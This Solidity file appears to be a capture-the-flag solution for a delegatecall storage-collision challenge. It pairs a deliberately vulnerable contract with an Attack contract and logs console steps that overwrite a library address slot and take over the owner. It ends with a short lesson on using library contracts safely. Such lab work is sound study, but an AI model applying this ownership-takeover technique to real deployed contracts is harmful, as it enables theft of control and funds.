// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint _time) public {
        owner = msg.sender;
    }
}

contract Preservation {
    // public library contracts

    // slot 0
    address public timeZone1Library;

    // slot 1
    address public timeZone2Library;

    // slot 2
    address public owner;

    // slot 3
    uint storedTime;

    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(
        address _timeZone1LibraryAddress,
        address _timeZone2LibraryAddress
    ) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    /* 
    call this function to delegate call 
    > setTimeSignature
    > call setTime on Attack contract to get owner
    */
    function setFirstTime(uint _timeStamp) public {
        timeZone1Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }

    // set the time for timezone 2
    function setSecondTime(uint _timeStamp) public {
        timeZone2Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    // slot 0
    uint storedTime;

    function setTime(uint _time) public {
        storedTime = _time;
    }
}

/*
Note:

await contract.timeZone1Library()
'0xf88ed7D1Dfcd1Bb89a975662fd7cB536058F3a30'

await contract.timeZone2Library()
'0x7F08c632697Adf1b5052d2Eb82D3A272B0B92312'

timeZone1Library
await web3.eth.getStorageAt(contract.address,0, console.log)
'0x000000000000000000000000f88ed7d1dfcd1bb89a975662fd7cb536058f3a30'

timeZone2Library
await web3.eth.getStorageAt(contract.address,1, console.log)
'0x0000000000000000000000007f08c632697adf1b5052d2eb82d3a272b0b92312'

owner
await web3.eth.getStorageAt(contract.address,2, console.log)
'0x0000000000000000000000007ae0655f0ee1e7752d7c62493cea1e69a810e2ed'

slot 3 = no value
await web3.eth.getStorageAt(contract.address,3, console.log)
'0x0000000000000000000000000000000000000000000000000000000000000000'

set first time to Attack contract
contract.setFirstTime("0x2a08f6206f30D44590463F82A93BAb2e5Aae05A6")

timeZone1Library is change to address contract
await web3.eth.getStorageAt(contract.address,0, console.log)
'0x0000000000000000000000002a08f6206f30d44590463f82a93bab2e5aae05a6'

call function setFirstTimeone one more time to use delegatecall to call attack contract to setTime > change owner to sender
await contract.setFirstTime("123123")

await contract.owner()
'0x6507A5F34D98B8345e182EF588AB14A7F4E714AE'

You got the owner :)
*/

/*
Result

As the previous level, delegate mentions, the use of delegatecall to call libraries can be risky. 
This is particularly true for contract libraries that have their own state. 
This example demonstrates why the library keyword should be used for building libraries, 
as it prevents the libraries from storing and accessing state variables.

*/
